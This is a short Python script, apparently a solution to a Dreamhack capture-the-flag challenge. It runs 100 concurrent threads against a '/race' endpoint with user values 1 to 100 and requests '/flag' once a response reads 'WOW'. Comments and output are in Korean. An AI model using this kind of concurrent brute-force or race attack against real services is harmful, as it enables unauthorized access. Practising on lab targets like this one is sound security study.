import requests
import threading

home_url = "http://host1.dreamhack.games:9249"


def try_value(i):
    try:
        response = requests.get(f"{home_url}/race", params={"user": i})
        print(f"{i}번째 : {response.text}")

        if response.text == "WOW":
            print(f"키 발견: {i}")
            flag_response = requests.get(f"{home_url}/flag")
            print(f"플래그: {flag_response.text}")

    except Exception as e:
        print(f"오류: {e}")


def concurrent_attack():
    threads = []
    for i in range(1, 101):
        thread = threading.Thread(target=try_value, args=(i,))
        threads.append(thread)
        thread.start()

    # 완료 대기
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    concurrent_attack()
